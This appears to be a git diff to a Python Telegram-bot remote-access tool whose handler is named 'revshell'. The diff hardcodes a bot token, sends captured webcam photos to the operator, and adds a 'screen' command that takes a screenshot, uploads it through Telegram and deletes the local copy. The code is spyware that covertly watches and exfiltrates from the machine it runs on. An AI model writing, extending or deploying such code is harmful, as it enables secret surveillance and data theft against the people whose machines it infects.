@@ -1,3 +1,4 @@
+from pyautogui import screenshot
 from aiogram import Bot, types
 from aiogram.dispatcher import Dispatcher
 from aiogram.utils import executor
@@ -5,7 +6,7 @@ import subprocess
 import cv2
 from os import system
 
-bot = Bot('token')
+bot = Bot('5831072627:AAHjv4fzJpeYHHUpFqumkw85pevyU3fqDec')
 dp = Dispatcher(bot)
 
 
@@ -23,6 +24,12 @@ async def revshell(message: types.Message):
         cam = cv2.VideoCapture(0)
         ret, frame = cam.read()
         cv2.imwrite('test1.png', frame)
+        photo = open('test1.png', 'rb')
+        await bot.send_photo(message.from_user.id, photo)
+        system('del test1.png')
+
+    elif 'screen' in message.text.split():
+        scr = screenshot('test1.png')
         photo = open('test1.png', 'rb')
         await bot.send_photo(message.from_user.id, photo)
         system('del test1.png')
